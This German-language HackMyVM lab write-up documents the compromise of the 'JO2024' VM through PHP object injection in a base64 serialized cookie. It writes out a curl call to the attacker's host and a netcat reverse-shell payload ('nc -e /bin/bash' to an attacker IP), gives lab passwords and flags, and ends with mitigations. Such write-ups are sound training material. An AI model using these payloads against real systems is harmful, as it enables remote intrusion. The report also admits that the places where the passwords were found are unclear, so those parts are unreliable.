# JO2024 (HackMyVM) - Penetration Test Bericht

![JO2024.png](JO2024.png)

**Datum des Berichts:** 21. August 2024  
**VM:** JO2024  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=JO2024](https://hackmyvm.eu/machines/machine.php?vm=JO2024)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/JO2024_HackMyVM_Medium/](https://alientec1908.github.io/JO2024_HackMyVM_Medium/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (PHP Object Injection)](#phase-2-web-enumeration--initial-access-php-object-injection)
5.  [Phase 3: Privilege Escalation (www-data -> vanity -> root)](#phase-3-privilege-escalation-www-data---vanity---root)
    *   [www-data zu vanity (Passwortfund)](#www-data-zu-vanity-passwortfund)
    *   [vanity zu root (Passwortfund)](#vanity-zu-root-passwortfund)
6.  [Proof of Concept (Initial Access via POI)](#proof-of-concept-initial-access-via-poi)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "JO2024" von HackMyVM (Schwierigkeitsgrad: Medium). Die initiale Erkundung offenbarte offene SSH- (Port 22) und HTTP-Dienste (Apache auf Port 80). Die Web-Enumeration führte zur Entdeckung der Seite `preferences.php`. Ein Cookie namens `preferences` enthielt einen Base64-kodierten, serialisierten PHP-String. Diese Anwendung war anfällig für PHP Object Injection (POI). Durch Manipulation des serialisierten Objekts im Cookie konnte Remote Code Execution (RCE) erreicht werden, was zu einer Reverse Shell als Benutzer `www-data` führte.

Die Privilegieneskalation erfolgte in zwei Schritten:
1.  **www-data zu vanity:** Während der Enumeration als `www-data` wurde (vermutlich in einer Konfigurationsdatei oder einem Skript im Webroot, Details im Log unklar) das Passwort `xd0oITR93KIQDbiD` gefunden. Dieses Passwort gehörte dem Benutzer `vanity`, zu dem mittels SSH gewechselt werden konnte.
2.  **vanity zu root:** Als `vanity` wurde (vermutlich im Verzeichnis `creds` oder beim Untersuchen des Skripts `/usr/local/bin/php-server.sh`) ein weiteres Passwort, `LightningBolt123`, gefunden. Dieses Passwort gehörte dem `root`-Benutzer und ermöglichte den direkten Wechsel zu `root` mittels `su`.

---

## Verwendete Tools

*   `arp-scan`
*   `vi` (impliziert für Hosts-Datei und Skriptbearbeitung)
*   `nmap`
*   `grep`
*   `nikto`
*   `gobuster`
*   `CyberChef` (impliziert für Base64-Dekodierung und Serialisierungs-Payload-Erstellung)
*   `wfuzz`
*   `curl`
*   `wappalyzer` (Browser-Erweiterung, erwähnt)
*   `python3 http.server`
*   `nc (netcat)`
*   `stty` (für Shell-Stabilisierung)
*   `id`, `ls`, `cat`, `cd`
*   `ssh`
*   `nano` (versucht/impliziert)
*   `sudo`
*   `su`
*   `file`
*   `lsblk`, `mount` (im Log erwähnt, aber nicht direkt zum Exploit verwendet)

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan und Host-Konfiguration:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.107` (VirtualBox VM).
    *   Der Hostname `jo2024.hmv` wurde der lokalen `/etc/hosts`-Datei hinzugefügt.

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sC -sS -sV -A -T5 192.168.2.107 -p- [...]`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 9.2p1 Debian
        *   **Port 80 (HTTP):** Apache httpd 2.4.61 (Debian), Seitentitel "Paris 2024 Olympic Games".

---

## Phase 2: Web Enumeration & Initial Access (PHP Object Injection)

1.  **Web-Enumeration:**
    *   `nikto` auf Port 80 fand fehlende Sicherheitsheader und ein Verzeichnis `/img/` mit aktiviertem Directory Indexing.
    *   `gobuster dir` fand `/index.php`, `/img/` und `preferences.php`.
    *   `wfuzz` für Subdomain-Enumeration fand `pictures.jo2024.hmv`. Diese Subdomain zeigte ein Formular zum Herunterladen von Bildern, wurde aber nicht weiter für den Initial Access genutzt.

2.  **Identifizierung der PHP Object Injection (POI):**
    *   Auf `http://jo2024.hmv/preferences.php` wurde ein Cookie namens `preferences` gefunden.
    *   Der Wert des Cookies war Base64-kodiert: `TzoxNToiVXNlclByZWZlcmVuY2VzIjoyntzjg6Imxhbmd1YWdlIjtzjI6ImZyIjtzjE1iJiYWNrZ3JvdW5kQ29sb3Ii3M6NDoiI2RkZCI7fQ%3D%3D`
    *   Dekodiert ergab dies einen serialisierten PHP-String: `O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";}`.
    *   Durch Modifikation des `language`-Feldes (z.B. zu `danke`) und erneutes Kodieren/Setzen des Cookies konnte bestätigt werden, dass die Anwendung den serialisierten String verarbeitet.

3.  **Ausnutzung der POI für RCE:**
    *   Ein Payload wurde erstellt, um mittels `curl` eine SSRF-Anfrage zu einem Python-HTTP-Server des Angreifers zu senden und so die Codeausführung zu bestätigen. Serialisierter Payload (Ausschnitt): `s:8:"language";s:26:"curl http://[Angreifer-IP]:8000";`
    *   Anschließend wurde ein Payload für eine Reverse Shell erstellt. Serialisierter Payload (Ausschnitt): `s:8:"language";s:34:"nc -e /bin/bash [Angreifer-IP] 8000";`
    *   Dieser Base64-kodierte Payload wurde in den `preferences`-Cookie eingefügt.
    *   Ein `nc -lvnp 8000` auf dem Angreifer-System empfing die Verbindung. Initialer Zugriff als `www-data` wurde erlangt und die Shell stabilisiert.

---

## Phase 3: Privilege Escalation (www-data -> vanity -> root)

### www-data zu vanity (Passwortfund)

1.  **Enumeration als `www-data`:**
    *   Das Home-Verzeichnis `/home/vanity/` wurde identifiziert.
    *   Zugriff auf `user.txt`, `creds/`, `.ssh/` im Home-Verzeichnis von `vanity` war für `www-data` nicht direkt möglich.
    *   Im Originalbericht wurde das Passwort `xd0oITR93KIQDbiD` gefunden (Fundort nicht explizit im Log, vermutlich in einer Konfigurationsdatei/Skript im Webroot).

2.  **SSH-Login als `vanity`:**
    *   Mit dem Passwort `xd0oITR93KIQDbiD` wurde ein SSH-Login als `vanity` durchgeführt:
        ```bash
        ssh vanity@192.168.2.107
        # Passwort: xd0oITR93KIQDbiD
        ```
    *   Zugriff als `vanity` wurde erlangt.
    *   Die User-Flag `e2cb9d6e0899cde91130ca4b37139021` wurde in `/home/vanity/user.txt` gefunden.

### vanity zu root (Passwortfund)

1.  **Enumeration als `vanity`:**
    *   Im Home-Verzeichnis von `vanity` oder durch Untersuchung des Skripts `/usr/local/bin/php-server.sh` (Details im Log unklar) wurde das Passwort `LightningBolt123` gefunden.

2.  **Benutzerwechsel zu `root`:**
    *   `vanity@jo2024:~$ su root` mit dem Passwort `LightningBolt123` war erfolgreich.
    *   Voller Root-Zugriff wurde erlangt.

---

## Proof of Concept (Initial Access via POI)

**Kurzbeschreibung:** Der initiale Zugriff erfolgte durch Ausnutzung einer PHP Object Injection Schwachstelle. Ein Cookie (`preferences`) enthielt einen Base64-kodierten, serialisierten PHP-String. Durch Manipulation dieses Strings, speziell des `language`-Feldes, konnte ein serialisiertes Objekt erstellt werden, das beim Deserialisieren auf dem Server einen `nc`-Befehl ausführte und eine Reverse Shell zum Angreifer startete.

**Schritte:**
1.  Identifiziere den `preferences`-Cookie auf `http://jo2024.hmv/preferences.php`.
2.  Dekodiere den Cookie-Wert (Base64).
3.  Modifiziere den serialisierten PHP-String, um eine Reverse-Shell-Payload im `language`-Feld einzufügen:
    ```php
    // Beispiel für den manipulierten Teil des Objekts
    // $obj->language = "nc -e /bin/bash [IP_DES_ANGREIFERS] [PORT]";
    // Serialisiere das modifizierte Objekt und kodiere es mit Base64.
    // Beispiel-Payload (Base64-kodiert):
    // TzoxNToiVXNlclByZWZlcmVuY2VzIjoyntzjg6Imxhbmd1YWdlIjtzOjM0OiJuYyAtZSAvYmluL2Jhc2ggMTkyLjE2OC4yLjE5OSA4MDAwIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ==
    ```
4.  Starte einen Netcat-Listener auf dem Angreifer-System: `nc -lvnp [PORT]`.
5.  Setze den modifizierten, Base64-kodierten Cookie-Wert im Browser und lade `preferences.php` neu.
**Ergebnis:** Eine Reverse Shell als `www-data` verbindet sich zum Listener.

---

## Flags

*   **User Flag (`/home/vanity/user.txt`):**
    ```
    e2cb9d6e0899cde91130ca4b37139021
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    cbd60dab37bc85e1f7ea4b5c9c4eed90
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **PHP Object Injection (POI):**
    *   **DRINGEND:** **Deserialisieren Sie niemals unzuverlässige Daten (wie Cookies) direkt mit `unserialize()` in PHP.** Wenn Serialisierung notwendig ist, verwenden Sie sicherere Formate (z.B. JSON) oder implementieren Sie eine strikte Validierung und Integritätsprüfung (z.B. HMAC-Signatur) der serialisierten Daten, bevor sie deserialisiert werden.
*   **Passwortsicherheit und -management:**
    *   **Speichern Sie Passwörter niemals im Klartext in Dateien**, die für Webserver-Prozesse oder andere unprivilegierte Benutzer lesbar sind.
    *   Erzwingen Sie starke, einzigartige Passwörter für alle System- und Anwendungsbenutzer.
    *   Deaktivieren Sie den direkten Root-Login via SSH und verwenden Sie stattdessen `sudo` mit spezifischen Berechtigungen.
*   **Webserver-Sicherheit:**
    *   Implementieren Sie fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`).
    *   Deaktivieren Sie Directory Indexing für Verzeichnisse, die keine öffentliche Auflistung erfordern.
*   **Sudo-Konfiguration:**
    *   Überprüfen Sie alle `sudo`-Regeln sorgfältig. Das Ausführen von Skripten (wie `/usr/local/bin/php-server.sh`) als `root` über `sudo` sollte vermieden werden, wenn das Skript manipulierbar ist oder unsichere Funktionen enthält.
*   **Allgemeine Systemhärtung:**
    *   Implementieren Sie das Prinzip der geringsten Rechte für alle Benutzer und Prozesse.
    *   Führen Sie regelmäßige Sicherheitsaudits und Schwachstellenscans durch.
    *   Überwachen Sie Systemlogs auf verdächtige Aktivitäten.

---

**Ben C. - Cyber Security Reports**
